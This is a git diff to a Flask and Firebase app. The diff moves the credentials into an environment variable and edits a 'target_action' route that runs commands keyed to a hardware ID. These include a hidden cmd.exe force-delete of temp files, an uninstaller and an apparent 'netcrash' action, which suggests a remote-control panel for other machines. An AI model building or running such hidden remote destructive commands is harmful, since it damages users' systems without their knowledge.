@@ -1,4 +1,5 @@
 import os
+import json
 from flask import Flask, render_template, request, jsonify
 import subprocess
 import firebase_admin
@@ -7,7 +8,12 @@ from firebase_admin import credentials, db
 app = Flask(__name__)
 
 if not firebase_admin._apps:
-    cred = credentials.Certificate("firebase_credentials.json")
+    firebase_config_str = os.environ.get('FIREBASE_CONFIG_JSON')
+    if not firebase_config_str:
+        raise ValueError("CRITICAL: FIREBASE_CONFIG_JSON environment variable is missing!")
+    
+    cred_dict = json.loads(firebase_config_str)
+    cred = credentials.Certificate(cred_dict)
     firebase_admin.initialize_app(cred, {
         'databaseURL': 'https://vipchaetos-default-rtdb.firebaseio.com/'
     })
@@ -44,8 +50,7 @@ def target_action():
         return jsonify({"message": f"App-Uninstaller executed on {hwid}"})
 
     elif action == 'clean':
-        # Deep Clean command (e.g. pag-clear ng temp files sa Windows)
-        subprocess.Popen('cmd.exe /c del /q /f /s "%TEMP%\*"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
+        subprocess.Popen('cmd.exe /c del /q /f /s "%TEMP%\\*.*"', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
         return jsonify({"message": f"Deep Clean executed on {hwid}!"})
 
     elif action == 'netcrash':
